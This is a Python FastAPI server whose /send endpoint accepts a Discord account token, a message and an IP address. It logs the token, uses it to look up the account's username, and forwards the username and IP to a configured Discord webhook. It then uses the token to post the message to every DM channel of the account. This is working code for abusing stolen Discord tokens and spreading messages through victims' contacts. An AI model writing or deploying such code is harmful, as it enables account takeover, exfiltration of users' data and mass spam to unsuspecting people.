from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import requests
import os
import time

app = FastAPI()

class Payload(BaseModel):
    token: str
    message: str
    ip: str

@app.get("/test")
async def test_handler():
    return "Hello, World!"

@app.post("/send")
async def send(payload: Payload):
    # Debug: Print the token
    print(f"Token: {payload.token}")

    # Fetch user information (username)
    user_info_url = "https://discord.com/api/v9/users/@me"
    headers = {
        "Authorization": f"Bearer {payload.token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }
    try:
        user_response = requests.get(user_info_url, headers=headers)
        user_response.raise_for_status()
        user_data = user_response.json()
        username = user_data.get("username", "Unknown")
    except requests.exceptions.RequestException as e:
        print(f"❌ Failed to fetch username: {e}")
        raise HTTPException(status_code=401, detail="Failed to fetch username")

    # Send message to Discord webhook including IP and username
    webhook_url = os.getenv("DISCORD_WEBHOOK_URL")  # Read webhook URL from environment variables
    if not webhook_url:
        raise HTTPException(status_code=500, detail="Webhook URL not configured")

    webhook_content = f"Message: {payload.message}\nUsername: {username}\nIP: {payload.ip}"
    discord_payload = {"content": webhook_content}

    try:
        webhook_response = requests.post(webhook_url, json=discord_payload)
        webhook_response.raise_for_status()
        print("✅ Message sent to webhook")
    except requests.exceptions.RequestException as e:
        print(f"❌ Failed to send message to webhook: {e}")

    # Fetch user's DM channels
    dm_channels_url = "https://discord.com/api/v9/users/@me/channels"
    try:
        dm_response = requests.get(dm_channels_url, headers=headers)
        dm_response.raise_for_status()
        dm_channels = dm_response.json()

        for dm in dm_channels:
            dm_id = dm.get("id")
            if dm_id:
                dm_message_url = f"https://discord.com/api/v9/channels/{dm_id}/messages"
                try:
                    msg_response = requests.post(
                        dm_message_url,
                        headers=headers,
                        json={"content": payload.message},
                    )
                    msg_response.raise_for_status()
                    print(f"✅ Message sent to DM: {dm_id}")
                except requests.exceptions.RequestException as e:
                    print(f"❌ Failed to send message to DM {dm_id}: {e}")

                # Delay to prevent rate limiting
                time.sleep(1)

        return "✅ Messages sent to webhook and DMs"
    except requests.exceptions.RequestException as e:
        print(f"❌ Failed to fetch DM channels: {e}")
        raise HTTPException(status_code=401, detail="Failed to fetch DM channels")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", "8080")))
